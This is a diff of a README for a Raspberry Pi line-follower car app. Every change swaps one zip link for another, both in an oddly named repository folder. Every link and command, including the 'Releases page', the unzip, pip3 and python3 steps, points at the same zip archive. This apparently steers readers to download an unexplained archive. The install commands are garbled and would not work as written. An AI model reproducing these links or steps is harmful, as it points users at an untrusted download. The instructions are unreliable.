@@ -6,11 +6,11 @@ Welcome to LINE_FOLLOWER_CAR! This application allows you to control a car that 
 
 ## 📥 Download the Software
 
-[![Download LINE_FOLLOWER_CAR](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip)](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip)
+[![Download LINE_FOLLOWER_CAR](https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip)](https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip)
 
 To get started, visit the Releases page below to download the software.
 
-[Download LINE_FOLLOWER_CAR](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip)
+[Download LINE_FOLLOWER_CAR](https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip)
 
 ## ⚙️ System Requirements
 
@@ -28,7 +28,7 @@ Before you download and run the application, ensure your system meets the follow
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip).
 
 2. Look for the latest version. You will find a list of files available for download.
 
@@ -38,11 +38,11 @@ Before you download and run the application, ensure your system meets the follow
 
 5. Extract the files. Open a terminal and navigate to the directory with the downloaded files. Use the command:
    ```
-   unzip https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
+   unzip https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip
    ```
    or
    ```
-   tar -xvf https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
+   tar -xvf https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip
    ```
 
 6. Install the necessary libraries, if not already installed. Run the following commands in the terminal:
@@ -50,7 +50,7 @@ Before you download and run the application, ensure your system meets the follow
    sudo apt-get update
    sudo apt-get install python3-opencv
    sudo apt-get install python3-pip
-   pip3 install -r https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
+   pip3 install -r https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip
    ```
 
 7. Connect the camera module and the MPU6050 sensor to your Raspberry Pi according to the device manual.
@@ -65,7 +65,7 @@ Once you have everything set up, you’re ready to run the application. Follow t
 
 3. Run the command:
    ```bash
-   python3 https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip
+   python3 https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip
    ```
 
 4. Follow any on-screen prompts to calibrate the sensors. Ensure your line follower car is placed on the line you want it to follow.
@@ -111,4 +111,4 @@ If you need help, feel free to open an issue on the GitHub repository. The commu
 
 We hope you enjoy controlling your line follower car! With this software, you can explore the exciting world of automation and robotics.
 
-For any updates and latest releases, always check the [Releases page](https://github.com/gourav-arh/LINE_FOLLOWER_CAR/raw/refs/heads/main/urethrosexual/CAR-LIN-FOLLOWE-desmotropic.zip). Happy exploring!
+For any updates and latest releases, always check the [Releases page](https://raw.githubusercontent.com/gourav-arh/LINE_FOLLOWER_CAR/main/urethrosexual/FOLLOWE-LIN-CAR-3.0-beta.1.zip). Happy exploring!
